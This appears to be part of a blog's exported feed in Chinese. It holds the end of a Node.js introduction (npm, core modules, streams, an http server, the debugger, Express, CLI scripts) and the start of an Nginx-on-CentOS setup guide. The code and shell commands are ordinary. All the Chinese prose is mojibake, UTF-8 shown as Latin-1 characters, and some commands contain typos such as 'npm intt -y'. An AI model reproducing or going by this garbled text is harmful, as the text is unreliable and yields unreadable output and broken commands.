npmæ³¨å†Œä¸­å¿ƒé‡Œçš„åŒ…ï¼Œä¹Ÿå¯ä»¥ç”¨å®ƒæ¥æŸ¥æ‰¾å’Œåˆ†äº«ä½ è‡ªå·±çš„é¡¹ç›®ï¼Œå¼€æºçš„å’Œé—­æºçš„éƒ½è¡Œã€‚æ³¨å†Œä¸­å¿ƒé‡Œçš„æ¯ä¸ª npm åŒ…éƒ½ä¼šæœ‰ä¸ªé¡µé¢æ˜¾ç¤ºå®ƒçš„è‡ªè¿°æ–‡ä»¶ã€ä½œè€…å’Œä¸‹è½½ç»Ÿè®¡ä¿¡æ¯ã€‚å¦å¤–ï¼Œnpm è¿˜æ˜¯ä¸€å®¶æä¾› npm æœåŠ¡çš„å…¬å¸çš„åå­—ã€‚è¿™å®¶å…¬å¸ä¸ºä¼ä¸šæä¾›å•†ä¸šæœåŠ¡ï¼ŒåŒ…æ‹¬æ‰˜ç®¡ç§æœ‰çš„ npmåŒ…ã€‚ä½ å¯ä»¥æŒ‰æœˆæ”¯ä»˜æœåŠ¡è´¹ï¼ŒæŠŠå…¬å¸çš„æºç æ‰˜ç®¡ç»™ä»–ä»¬ï¼Œè¿™æ ·ä½ çš„ JavaScriptå¼€å‘äººå‘˜å°±å¯ä»¥ç”¨ npmè½»æ¾å®‰è£…ä½ çš„ç§æœ‰åŒ…äº†ã€‚ npmè¦æ±‚ Nodeé¡¹ç›®æ‰€åœ¨çš„ç›®å½•ä¸‹æœ‰ä¸€ä¸ª package.jsonæ–‡ä»¶ã€‚åˆ›å»º package.jsonæ–‡ä»¶çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ npmã€‚åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä¸‹é¢è¿™äº›å‘½ä»¤ï¼š 123mkdir example-projectcd example-projectnpm init -y æ‰“å¼€ package.jsonï¼Œä½ ä¼šçœ‹åˆ°ç®€å•çš„ JSON æ ¼å¼çš„é¡¹ç›®æè¿°ä¿¡æ¯ã€‚å¦‚æžœä½ çŽ°åœ¨ç”¨å¸¦æœ‰å‚æ•°--save çš„ npmå‘½ä»¤ä»Ž npm ç½‘ç«™ä¸Šå®‰è£…ä¸€ä¸ªåŒ…ï¼Œå®ƒä¼šè‡ªåŠ¨æ›´æ–°ä½ çš„ package.jsonæ–‡ä»¶ã€‚è¯•ç€è¾“å…¥ npm install ï¼Œæˆ–ç®€å†™ä¸º npm i ï¼š 1npm i --save express æ‰“å¼€ package.jsonï¼Œåº”è¯¥ä¼šçœ‹åˆ° dependencies å±žæ€§ä¸‹é¢æ–°å¢žåŠ çš„ express ã€‚å¦å¤–ï¼Œçœ‹ä¸€ä¸‹node_modules æ–‡ä»¶å¤¹ï¼Œä½ ä¼šçœ‹åˆ°æ–°åˆ›å»ºçš„ expressç›®å½•ã€‚é‡Œé¢æ˜¯åˆšå®‰è£…çš„é‚£ä¸ªç‰ˆæœ¬çš„ Expressã€‚ä½ ä¹Ÿå¯ä»¥ç”¨ â€“global å‚æ•°åšå…¨å±€å®‰è£…ã€‚åº”å°½å¯èƒ½åœ°å°†åŒ…å®‰è£…åœ¨é¡¹ç›®é‡Œï¼Œä½†å¯¹äºŽç”¨åœ¨ Node JavaScriptä»£ç ä¹‹å¤–çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå…¨å±€å®‰è£…æ›´åˆé€‚ã€‚æ¯”å¦‚ç”¨ npm å®‰è£…å‘½ä»¤è¡Œå·¥å…· ESLint æ—¶ï¼Œæˆ‘ä»¬é‡‡ç”¨å…¨å±€å®‰è£…ã€‚ Nodeè¿˜è‡ªå¸¦äº†å¾ˆå¤šéžå¸¸å®žç”¨çš„åº“ï¼Œç»Ÿç§°ä¸ºæ ¸å¿ƒæ¨¡å—ã€‚ æ ¸å¿ƒæ¨¡å—Nodeçš„æ ¸å¿ƒæ¨¡å—ç›¸å½“äºŽå…¶ä»–è¯­è¨€çš„æ ‡å‡†åº“ï¼Œå®ƒä»¬æ˜¯ç¼–å†™æœåŠ¡å™¨ç«¯ JavaScript æ‰€éœ€è¦çš„å·¥å…·ã€‚JavaScript æ ‡å‡†æœ¬èº«æ²¡æœ‰ä»»ä½•å¤„ç†ç½‘ç»œçš„ä¸œè¥¿ï¼Œç”šè‡³è¿žå¤„ç†æ–‡ä»¶I/Oçš„ä¸œè¥¿éƒ½æ²¡æœ‰ã€‚Nodeä»¥æœ€å°‘çš„ä»£ç ç»™å®ƒåŠ ä¸Šäº†æ–‡ä»¶å’ŒTCP/IPç½‘ç»œåŠŸèƒ½ï¼Œä½¿å…¶æˆä¸ºäº†ä¸€ä¸ªå¯ç”¨çš„æœåŠ¡å™¨ç«¯ç¼–ç¨‹è¯­è¨€ã€‚ æ–‡ä»¶ç³»ç»Ÿ Node ä¸ä»…æœ‰æ–‡ä»¶ç³»ç»Ÿ(fsã€path)ã€TCPå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åº“ï¼ˆnetï¼‰ã€HTTPåº“ï¼ˆhttpå’Œhttpsï¼‰å’ŒåŸŸåè§£æžåº“ï¼ˆdnsï¼‰ï¼Œè¿˜æœ‰ä¸€äº›ç»å¸¸ç”¨æ¥å†™åˆ¤æ–­çš„æ–­è¨€åº“ï¼ˆassertï¼‰ï¼Œä»¥åŠä¸€ä¸ªç”¨æ¥æŸ¥è¯¢å¹³å°æ¶ˆæ¯çš„æ“ä½œç³»ç»Ÿåº“ï¼ˆosï¼‰ Node è¿˜æœ‰ä¸€äº›ç‹¬æœ‰åº“ã€‚äº‹ä»¶æ¨¡å—æ˜¯ä¸€ä¸ªå¤„ç†äº‹ä»¶çš„å°åž‹åº“ï¼ŒNodeçš„å¤§å¤šæ•°APIéƒ½æ˜¯ä»¥å®ƒä¸ºåŸºç¡€æ¥åšçš„ã€‚æ¯”å¦‚è¯´ï¼Œæµæ¨¡å—ç”¨äº‹ä»¶æ¨¡å—æä¾›äº†ä¸€ä¸ªå¤„ç†æµæ•°æ®çš„æŠ½è±¡æŽ¥å£ã€‚å› ä¸ºNode ä¸­çš„æ‰€æœ‰æ•°æ®æµç”¨çš„éƒ½æ˜¯åŒæ ·çš„APIï¼Œæ‰€ä»¥å¯ä»¥è½»æ¾ç»„è£…å‡ºæ¥è½¯ä»¶ç»„ä»¶ã€‚å¦‚æžœæœ‰ä¸€ä¸ªæ–‡ä»¶æµè¯»å–å™¨ï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æŠŠå®ƒè·ŸåŽ‹ç¼©æ•°æ®çš„ zlib è¿žæŽ¥åœ¨ä¸€èµ·ï¼Œç„¶åŽè¿™ä¸ª zlib å†è¿žæŽ¥ä¸€ä¸ªæ–‡ä»¶æµå†™å…¥å™¨ï¼Œä»Žè€Œå½¢æˆä¸€ä¸ªæ–‡ä»¶æµå¤„ç†ç®¡é“ã€‚ ä¸‹é¢ä»£ç ä¸­ï¼Œç”¨Node çš„ fs æ¨¡å—åˆ›å»ºäº†è¯»å’Œå†™æµï¼Œç„¶åŽæŠŠå®ƒä»¬é€šè¿‡å¦å¤–ä¸€ä¸ªæµï¼ˆgzipï¼‰è¿žæŽ¥èµ·æ¥ä¼ è¾“æ•°æ®ã€‚ 123456const fs = require('fs');const zlib = require('zlib');const gzip = zlib.createGzip();const outStream = fs.createWriteStream('output.js.gz');fs.createReadStream('./node-stream.js').pipe(gzip).pipe(outStream); ç½‘ç»œ åœ¨Node ä¸­æ­ä¸€ä¸ªæœåŠ¡å™¨åªéœ€è¦åŠ è½½ http æ¨¡å—ï¼Œç„¶åŽç»™å®ƒä¸€ä¸ªå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå³è¯·æ±‚å’Œå“åº”ã€‚ 12345678const http = require('http');const port = 8080;const server = http.createServer((req,res) =&gt;&#123; res.end('Hello world'); &#125;);server.listen(port,()=&gt;&#123; console.log('Server listening on http://localhost:%s',port);&#125;); å°†ä¸Šé¢çš„ä»£ç ä¿å­˜åˆ°hellow.jsæ–‡ä»¶ä¸­ï¼Œç”¨ node hello.js è¿è¡Œå®ƒï¼Œå°±å¯ä»¥åœ¨ http://locahost:8080 çœ‹åˆ°è¿™æ®µæ¶ˆæ¯ã€‚ è°ƒè¯•å™¨Node è‡ªå¸¦è°ƒè¯•å™¨æ”¯æŒå•æ­¥æ‰§è¡Œ REPLï¼ˆè¯»å–-è®¡ç®—-è¾“å‡º-å¾ªçŽ¯ï¼‰ã€‚è¿™ä¸ªè°ƒè¯•å™¨åœ¨å·¥ä½œæ—¶ä¼šç”¨ä¸€ä¸ªç½‘ç»œåè®®è·Ÿä½ çš„ç¨‹åºå¯¹è¯ã€‚å¸¦ç€ debug å‚æ•°è¿è¡ŒåŸŽè¥¿ï¼Œå°±å¯ä»¥å¯¹è¿™ä¸ªç¨‹åºå¼€å¯è°ƒè¯•å™¨ã€‚æ¯”å¦‚è¦è°ƒè¯•ä¸Šé¢çš„ä»£ç  1node debug hello.js ç„¶åŽå¯ä»¥çœ‹åˆ°ä¸‹é¢çš„è¾“å‡º 1234567&lt; Debugger listening on ws://127.0.0.1:9229/55258211-4e9c-444c-90eb-9f84c28fb532&lt; For help see https://nodejs.org/en/docs/inspector&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; const http = require('http'); 2 const port = 8080; 3 const server = http.createServer((req,res) =&gt;&#123; æˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸­çš„ä»»ä½•åœ°æ–¹æ·»åŠ  debugger è¯­å¥æ¥è®¾ç½®æ–­ç‚¹ã€‚é‡åˆ° debugger è¯­å¥åŽï¼Œè°ƒè¯•å™¨å°±ä¼šæŠŠç¨‹åºåœä½ï¼Œç„¶åŽä½ å¯ä»¥è¾“å…¥å‘½ä»¤ã€‚æ¯”å¦‚è¯´ï¼Œä½ å†™äº†ä¸€ä¸ª REST APIæ¥ä¸ºæ–°ç”¨æˆ·åˆ›å»ºè´¦å·ï¼Œä½†å‘çŽ°ä»£ç è²Œä¼¼æ²¡æœ‰æŠŠæ–°ç”¨æˆ·å¯†ç çš„æ•£åˆ—å€¼å†™åˆ°æ•°æ®åº“é‡Œã€‚ä½ å¯ä»¥åœ¨ User ç±»çš„ save æ–¹æ³•é‚£é‡ŒåŠ ä¸€ä¸ª debugger ï¼Œç„¶åŽå•æ­¥æ‰§è¡Œæ¯ä¸€æ¡æŒ‡ä»¤ï¼Œçœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆã€‚ äº¤äº’å¼è°ƒè¯• Nodeæ”¯æŒ Chromeè°ƒè¯•åè®®ã€‚å¦‚æžœè¦ç”¨ Chromeçš„å¼€å‘è€…å·¥å…·è°ƒè¯•ä¸€æ®µè„šæœ¬ï¼Œå¯ä»¥åœ¨è¿è¡Œç¨‹åºæ—¶åŠ ä¸Š â€“inspect å‚æ•°ï¼š 1node --inspect --debug-brk è¿™æ · Node å°±ä¼šå¯åŠ¨è°ƒè¯•å™¨ï¼Œå¹¶åœåœ¨ç¬¬ä¸€è¡Œã€‚å®ƒä¼šè¾“å‡ºä¸€ä¸ª URL åˆ°æŽ§åˆ¶å°ï¼Œä½ å¯ä»¥åœ¨Chrome ä¸­æ‰“å¼€è¿™ä¸ª URLï¼Œç„¶åŽç”¨ Chromeçš„è°ƒè¯•å™¨è¿›è¡Œè°ƒè¯•ã€‚Chromeçš„è°ƒè¯•å™¨å¯ä»¥ä¸€è¡Œè¡Œåœ°æ‰§è¡Œä»£ç ï¼Œè¿˜èƒ½æ˜¾ç¤ºæ¯ä¸ªå˜é‡å’Œå¯¹è±¡çš„å€¼ã€‚è¿™è¦æ¯”åœ¨ä»£ç é‡Œæ•² console.log å¥½å¾—å¤šã€‚ ä¸‰ç§ä¸»æµçš„Nodeç¨‹åºNode ç¨‹åºä¸»è¦åˆ†æˆä¸‰ç§ç±»åž‹ï¼šWeb åº”ç”¨ç¨‹åºã€å‘½ä»¤è¡Œå·¥å…·å’ŒåŽå°ç¨‹åºã€æ¡Œé¢ç¨‹åºã€‚æä¾›å•é¡µåº”ç”¨çš„ç®€å•ç¨‹åºã€RESTå¾®æœåŠ¡å·²ç»å…¨æ ˆçš„Webåº”ç”¨éƒ½å±žäºŽWebåº”ç”¨ç¨‹åºã€‚npm/gulpå’Œwebpack éƒ½å±žäºŽNodeå†™çš„å‘½ä»¤è¡Œå·¥å…·ã€‚åŽå°ç¨‹åºå°±æ˜¯åŽå°æœåŠ¡ï¼Œæ¯”å¦‚PM2è¿›ç¨‹ç®¡ç†å™¨ã€‚æ¡Œé¢ç¨‹åºä¸€èˆ¬æ˜¯ç”¨Electronæ¡†æž¶å†™çš„è½¯ä»¶ï¼ŒElectronç”¨Nodeä½œä¸ºåŸºäºŽWeb çš„æ¡Œé¢åº”ç”¨çš„åŽå°ã€‚Atom å’Œ Studio Code æ–‡æœ¬ç¼–è¾‘å™¨éƒ½å±žäºŽè¿™ä¸€ç±»ã€‚ Web åº”ç”¨ç¨‹åºNode æ˜¯æœåŠ¡ç«¯JavaScriptå¹³å°ï¼Œæ‰€ä»¥ç”¨å®ƒæ­å»ºWebåº”ç”¨ç¨‹åºæ˜¯ç†æ‰€å½“ç„¶çš„äº‹ä»¶ã€‚æ—¢ç„¶å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç”¨çš„éƒ½æ˜¯ JavaScript ï¼Œä»£ç éš¾å…ä¼šæœ‰åœ¨è¿™ä¸¤ç§çŽ¯å¢ƒé‡Œé‡ç”¨çš„æœºä¼šã€‚Node Web åº”ç”¨ä¸€èˆ¬æ˜¯ç”¨ Express è¿™æ ·çš„æ¡†æž¶å†™çš„ã€‚åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œå®‰è£…Express æ¨¡æ¿ï¼Œæ¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªExpress Web åº”ç”¨ç¨‹åº 1234mkdir hello_expresscd hello_expressnpm intt -ynpm i express --S æŠŠä»£ç å­˜åˆ° server.js ä¸­ 12345678const express = require('express');const app = express();app.get('/',(req,res) =&gt;&#123; res.send('Hello World!');&#125;);app.listen(3000,()=&gt;&#123; console.log('Express web app on localhost:3000');&#125;); æŽ¥ç€è¾“å…¥ 1npm start å¯åŠ¨è¿™ä¸ªç›‘å¬ç«¯å£3000çš„ Node Web æœåŠ¡å™¨ã€‚åœ¨æµè§ˆå™¨æ‰“å¼€å°±å¯ä»¥çœ‹åˆ° res.send é‡Œé¢çš„æ–‡æœ¬äº†ã€‚ å‘½ä»¤è¡Œå·¥å…·å’ŒåŽå°ç¨‹åºNode å¯ä»¥ç”¨æ¥ç¼–å†™å‘½ä»¤è¡Œå·¥å…·ï¼Œæ¯”å¦‚ JavaScript å¼€å‘äººå‘˜æ‰€ç”¨çš„è¿›ç¨‹ç®¡ç†å™¨å’Œè½¬ä¹‰å™¨ã€‚å®ƒå¯ä»¥ä½œä¸ºä¸€ç§æ–¹ä¾¿çš„æ–¹å¼æ¥ç¼–å†™å…¶ä»–æ“ä½œçš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ¯”å¦‚å›¾ç‰‡è½¬æ¢ã€æŽ§åˆ¶åª’ä½“æ–‡ä»¶çš„æ’­æ”¾çš„è„šæœ¬ç­‰ã€‚ ä¸‹é¢çš„ä¾‹å­ 123// cli.jsconst [nodePath, scriptPath, name]= process.argv;console.log('Hello',name,nodePath,scriptPath); ç„¶åŽè¿è¡Œ 1node cli.js yourName ä¼šæ‰“å°å‡ºæ¥ 1Hello yourName è¿™é‡Œç”¨äº†è§£æž„ï¼Œä»Ž process.argv ä¸­æ‹‰å–ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚æ‰€æœ‰ Node ç¨‹åºéƒ½å¯ä»¥è®¿é—® process å¯¹è±¡ï¼Œè¿™æ˜¯ç”¨æˆ·å‘ç¨‹åºä¸­ä¼ é€’å‚æ•°çš„åŸºç¡€ã€‚ Node å‘½ä»¤è¡Œè¿˜å¯ä»¥åšå…¶ä»–äº‹æƒ…ã€‚å¦‚æžœåœ¨ç¨‹åºçš„å¼€å¤´åŠ ä¸Š #ï¼,å¹¶èµ‹äºˆå…¶æ‰§è¡Œè®¸å¯ï¼ˆ chmod +x cli.js ï¼‰ï¼Œshell å°±å¯ä»¥åœ¨è°ƒç”¨ç¨‹åºæ—¶ä½¿ç”¨ Nodeã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åƒè¿è¡Œå…¶ä»– shell è„šæœ¬é‚£æ ·è¿è¡Œ Nodeç¨‹åºã€‚åœ¨ç±» Unixç³»ç»Ÿä¸­ç”¨ä¸‹é¢è¿™æ ·çš„ä»£ç ï¼š 1#!/usr/bin/env node è¿™æ ·ä½ å°±å¯ä»¥ç”¨ Nodeä»£æ›¿ shellè„šæœ¬ã€‚ä¹Ÿå°±æ˜¯è¯´ Nodeå¯ä»¥è·Ÿå…¶ä»–ä»»ä½•å‘½ä»¤è¡Œå·¥å…·é…åˆï¼ŒåŒ…æ‹¬åŽå°ç¨‹åºã€‚Nodeç¨‹åºå¯ä»¥ç”± cronè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºåŽå°ç¨‹åºè¿è¡Œã€‚ æ¡Œé¢ç¨‹åºå¦‚æžœä½ ç”¨è¿‡ Atomæˆ– Visual Studio Codeæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œé‚£å°±ç”¨è¿‡ Nodeã€‚Electronæ¡†æž¶ç”¨ NodeåšåŽå°ï¼Œæ‰€ä»¥åªè¦éœ€è¦è®¿é—®ç¡¬ç›˜æˆ–ç½‘ç»œï¼ŒElectron å°±ä¼šç”¨åˆ° Nodeã€‚Electron è¿˜ç”¨ Node æ¥ç®¡ç†ä¾èµ–é¡¹ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¯ä»¥ç”¨ npmå¾€ Electroné¡¹ç›®é‡Œæ·»åŠ åŒ…ã€‚ Electron é€‚åˆ Node çš„åº”ç”¨ç¨‹åºæˆ‘ä»¬å·²ç»çœ‹è¿‡ä¸€äº›èƒ½ç”¨ Nodeæ­å»ºçš„åº”ç”¨ç¨‹åºäº†ï¼Œä½† Nodeæ“…é•¿çš„é¢†åŸŸä¸æ­¢äºŽæ­¤ã€‚Nodeä¸€èˆ¬ç”¨æ¥åˆ›å»ºå®žæ—¶çš„ Web åº”ç”¨ï¼Œè¿™å‡ ä¹Žæ— æ‰€ä¸åŒ…ï¼Œä»Žç›´æŽ¥é¢å¯¹ç”¨æˆ·çš„èŠå¤©æœåŠ¡å™¨åˆ°é‡‡é›†åˆ†æžæ•°æ®çš„åŽå°ç¨‹åºéƒ½å±žäºŽæ­¤ç±»ã€‚åœ¨ JavaScriptä¸­ï¼Œå‡½æ•°æ˜¯ä¸€ç­‰å¯¹è±¡ï¼ŒNodeåˆæœ‰å†…å»ºçš„äº‹ä»¶æ¨¡åž‹ï¼Œæ‰€ä»¥ç”¨å®ƒæ¥å†™å¼‚æ­¥å®žæ—¶ç¨‹åºæ¯”ç”¨å…¶ä»–è„šæœ¬è¯­è¨€æ›´è‡ªç„¶ã€‚å¦‚æžœä½ è¦æ­å»ºä¼ ç»Ÿçš„æ¨¡åž‹ï€­è§†å›¾ï€­æŽ§åˆ¶å™¨ï¼ˆMVCï¼‰Web åº”ç”¨ï¼Œç”¨ Node ä¹Ÿå¾ˆé€‚åˆã€‚Ghost ç­‰ä¸€äº›æµè¡Œçš„åšå®¢å¼•æ“Žå°±æ˜¯ç”¨ Node æ­å»ºçš„ã€‚åœ¨æ­å»ºè¿™å‡ ç§ç±»åž‹çš„ Web åº”ç”¨ç¨‹åºæ–¹é¢ï¼ŒNode æ˜¯ä¸€ä¸ªç»è¿‡å®žè·µæ£€éªŒçš„å¹³å°ã€‚è™½ç„¶å¼€å‘é£Žæ ¼è·Ÿç”¨ PHPçš„ WordPressä¸åŒï¼Œä½† Ghostæ”¯æŒçš„åŠŸèƒ½æ˜¯ç±»ä¼¼çš„ï¼ŒåŒ…æ‹¬æ¨¡æ¿å’Œå¤šç”¨æˆ·ç®¡ç†åŒºã€‚Nodeè¿˜èƒ½åšä¸€äº›ç”¨å…¶ä»–è¯­è¨€å¾ˆéš¾åšåˆ°çš„äº‹æƒ…ã€‚å®ƒæ˜¯åŸºäºŽ JavaScriptçš„ï¼Œæ‰€ä»¥åœ¨ Nodeä¸­èƒ½è¿è¡Œæµè§ˆå™¨ä¸­çš„ JavaScriptã€‚å¤æ‚çš„å®¢æˆ·ç«¯åº”ç”¨å¯ä»¥ç»è¿‡æ”¹é€ åœ¨ NodeæœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œè®©æœåŠ¡å™¨è¿›è¡Œé¢„æ¸²æŸ“ï¼Œä»Žè€ŒåŠ å¿«é¡µé¢åœ¨æµè§ˆå™¨ä¸­çš„æ¸²æŸ“é€Ÿåº¦ï¼Œä¹Ÿæœ‰åˆ©äºŽæœç´¢å¼•æ“Žè¿›è¡Œç´¢å¼•ã€‚æœ€åŽï¼Œå¦‚æžœä½ æƒ³è¦æ­å»ºä¸€ä¸ªæ¡Œé¢ç«¯æˆ–ç§»åŠ¨ç«¯åº”ç”¨ï¼Œå»ºè®®è¯•ä¸€ä¸‹ Electronï¼Œå®ƒä¹Ÿæ˜¯ç”± Node æ”¯æ’‘èµ·æ¥çš„ã€‚çŽ°åœ¨ Webç”¨æˆ·ç•Œé¢çš„ä½“éªŒè·Ÿæ¡Œé¢ç«¯åº”ç”¨ä¸€æ ·ä¸°å¯Œï¼ŒElectronæ¡Œé¢ç«¯åº”ç”¨è¶³ä»¥æŠ—è¡¡æœ¬åœ°Webåº”ç”¨ï¼Œè¿˜èƒ½ç¼©çŸ­å¼€å‘æ—¶é—´ã€‚Electronæ”¯æŒä¸‰ç§ä¸»æµæ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨ Windowsã€Linuxå’Œ macOSä¸Šé‡ç”¨è¿™äº›ä»£ç ã€‚ æ€»ç»“ Node æ˜¯ç”¨æ¥æ­å»º JavaScript åº”ç”¨ç¨‹åºçš„å¹³å°ï¼ŒåŸºäºŽäº‹ä»¶å’Œéžé˜»å¡žçš„ç‰¹æ€§ V8 è¢«ç”¨ä½œ JavaScript è¿è¡Œ libuv æ˜¯æä¾›å¿«é€Ÿã€è·¨å¹³å°ã€éžé˜»å¡žI/Oçš„æœ¬åœ°åº“ è¢«ç§°ä¸ºæ ¸å¿ƒæ¨¡å—çš„Node æ ‡å‡†åº“å¾ˆç²¾å·§ï¼Œä¸º JavaScript æ·»åŠ äº†ç£ç›˜I/O Node è‡ªå¸¦äº†ä¸€ä¸ªè°ƒè¯•å™¨å’Œä¾èµ–ç®¡ç†å™¨(npm) Node å¯ä»¥ç”¨äºŽæ­å»º Webåº”ç”¨ç¨‹åºã€å‘½ä»¤è¡Œå·¥å…·ã€ç”šè‡³æ¡Œé¢ç¨‹åºã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å¿…å¤‡çš„Nginxå­¦ä¹ ]]></title>
    <url>%2F2018-11-26-%E5%89%8D%E7%AB%AF%E5%BF%85%E5%A4%87%E7%9A%84Nginx%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[ç”±äºŽæœºç¼˜å·§åˆï¼Œè®¤è¯†äº†ä¸€äº›æœ‹å‹ï¼Œç»™æˆ‘ä»‹ç»äº†æ¬ç“¦å·¥çš„ç½‘ç«™ã€‚ä¹°äº†ä¸€ä¸ªå›½å¤–çš„æœåŠ¡å™¨ï¼Œæ—¢å¯ä»¥ç¿»å¢™åˆæ‹¥æœ‰äº†ä¸€ä¸ªæ­è½½ Centos 6 çš„æœåŠ¡å™¨ã€‚ä¸€å¹´19.99ç¾Žå…ƒï¼ŒæŠ˜åˆäººæ°‘å¸ä¹Ÿå°±130å·¦å³ï¼Œä¸€é”®æ­å»ºã€‚æœ‰å…´è¶£å¯ä»¥ç‚¹å‡»äº†è§£è¯¦æƒ…ã€‚ å¾ˆä¹…ä¹‹å‰å°±çœ‹åˆ°èƒ–å“¥ï¼Œå‡ºäº†å…³äºŽnginx çš„æ•™ç¨‹ï¼Œä»Šå¤©æ¥æ ¹æ®ä»–çš„æ•™ç¨‹åœ¨ä¹°çš„ linux æœåŠ¡å™¨ä¸Šé¢æ­å»º nginxã€‚ èƒ–å“¥çš„è§†é¢‘æ•™ç¨‹ è¿žæŽ¥ linux æœåŠ¡å™¨åœ¨è¿™é‡Œæˆ‘æ˜¯ç”¨äº† xshell6 å’Œ xftp6ã€‚å¯ä»¥ç›´æŽ¥åˆ°å®˜ç½‘å¡«ä¸ªé‚®ç®±ï¼Œç„¶åŽå®˜æ–¹ä¼šå‘ç»™ä½ é‚®ç®±åˆ†åˆ«çš„ä¸‹è½½åœ°å€ã€‚æˆ–è€…ä½ è§‰å¾—æ‡’çš„ï¼Œå¯ä»¥ç›´æŽ¥ç‚¹å‡»æˆ‘çš„ç™¾åº¦äº‘ç›˜ä¸‹è½½ äº†è§£Nginxå’ŒçŽ¯å¢ƒå‡†å¤‡Nginxæ˜¯ä»€ä¹ˆï¼ŸNginx (engine x) æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„HTTPå’Œåå‘ä»£ç†æœåŠ¡ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªIMAP/POP3/SMTPæœåŠ¡ã€‚Nginxæ˜¯ç”±ä¼Šæˆˆå°”Â·èµ›ç´¢è€¶å¤«ä¸ºä¿„ç½—æ–¯è®¿é—®é‡ç¬¬äºŒçš„Rambler.ruç«™ç‚¹ï¼ˆä¿„æ–‡ï¼šÐ Ð°Ð¼Ð±Ð»ÐµÑ€ï¼‰å¼€å‘çš„ï¼Œç¬¬ä¸€ä¸ªå…¬å¼€ç‰ˆæœ¬0.1.0å‘å¸ƒäºŽ2004å¹´10æœˆ4æ—¥ã€‚ Nginxæ˜¯ä¸€æ¬¾è½»é‡çº§çš„Web æœåŠ¡å™¨/åå‘ä»£ç†æœåŠ¡å™¨åŠç”µå­é‚®ä»¶ï¼ˆIMAP/POP3ï¼‰ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶åœ¨ä¸€ä¸ªBSD-like åè®®ä¸‹å‘è¡Œã€‚å…¶ç‰¹ç‚¹æ˜¯å æœ‰å†…å­˜å°‘ï¼Œå¹¶å‘èƒ½åŠ›å¼ºï¼Œäº‹å®žä¸Šnginxçš„å¹¶å‘èƒ½åŠ›ç¡®å®žåœ¨åŒç±»åž‹çš„ç½‘é¡µæœåŠ¡å™¨ä¸­è¡¨çŽ°è¾ƒå¥½ï¼Œä¸­å›½å¤§é™†ä½¿ç”¨nginxç½‘ç«™ç”¨æˆ·æœ‰ï¼šç™¾åº¦ã€äº¬ä¸œã€æ–°æµªã€ç½‘æ˜“ã€è…¾è®¯ã€æ·˜å®ç­‰ã€‚ï¼ˆä»¥ä¸Šå†…å®¹æ¥è‡ªç™¾åº¦ç™¾ç§‘ï¼‰ Nginxçš„ä¼˜ç‚¹ æ”¯æŒæµ·é‡é«˜å¹¶å‘ï¼šé‡‡ç”¨IOå¤šè·¯å¤ç”¨epollã€‚å®˜æ–¹æµ‹è¯•Nginxèƒ½å¤Ÿæ”¯æŒ5ä¸‡å¹¶å‘é“¾æŽ¥ï¼Œå®žé™…ç”Ÿäº§çŽ¯å¢ƒä¸­å¯ä»¥æ”¯æ’‘2-4ä¸‡å¹¶å‘è¿žæŽ¥æ•°ã€‚ å†…å­˜æ¶ˆè€—å°‘ï¼šåœ¨ä¸»æµçš„æœåŠ¡å™¨ä¸­Nginxç›®å‰æ˜¯å†…å­˜æ¶ˆè€—æœ€å°çš„äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨Nginx+PHPï¼Œåœ¨3ä¸‡å¹¶å‘é“¾æŽ¥ä¸‹ï¼Œå¼€å¯10ä¸ªNginxè¿›ç¨‹æ¶ˆè€—150Må†…å­˜ã€‚ å…è´¹ä½¿ç”¨å¯ä»¥å•†ä¸šåŒ–ï¼šNginxä¸ºå¼€æºè½¯ä»¶ï¼Œé‡‡ç”¨çš„æ˜¯2-clause BSD-likeåè®®ï¼Œå¯ä»¥å…è´¹ä½¿ç”¨ï¼Œå¹¶ä¸”å¯ä»¥ç”¨äºŽå•†ä¸šã€‚ é…ç½®æ–‡ä»¶ç®€å•ï¼šç½‘ç»œå’Œç¨‹åºé…ç½®é€šä¿—æ˜“æ‡‚ï¼Œå³ä½¿éžä¸“ä¸šè¿ç»´ä¹Ÿèƒ½çœ‹æ‡‚ã€‚ ä½¿ç”¨yumå®‰è£…12yum -y install gcc gcc-c++ autoconf pcre-devel make automakeyum -y install wget httpd-tools vim åˆ†åˆ«ä½¿ç”¨ä¸Šé¢çš„æŒ‡ä»¤å®‰è£…ï¼Œå®‰è£…å®ŒæˆåŽä¼šæ˜¾ç¤ºå®‰è£…äº†ä»€ä¹ˆä¾èµ–ï¼Œå¤§æ¦‚ä¸‹é¢çš„æ ·å­ 12345678Installed: httpd-tools.x86_64 0:2.2.15-69.el6.centos vim-enhanced.x86_64 2:7.4.629-5.el6_8.1 wget.x86_64 0:1.12-10.el6 Dependency Installed: apr.x86_64 0:1.3.9-5.el6_9.1 apr-util.x86_64 0:1.3.9-3.el6_0.1 gpm-libs.x86_64 0:1.20.6-12.el6 vim-common.x86_64 2:7.4.629-5.el6_8.1 vim-filesystem.x86_64 2:7.4.629-5.el6_8.1 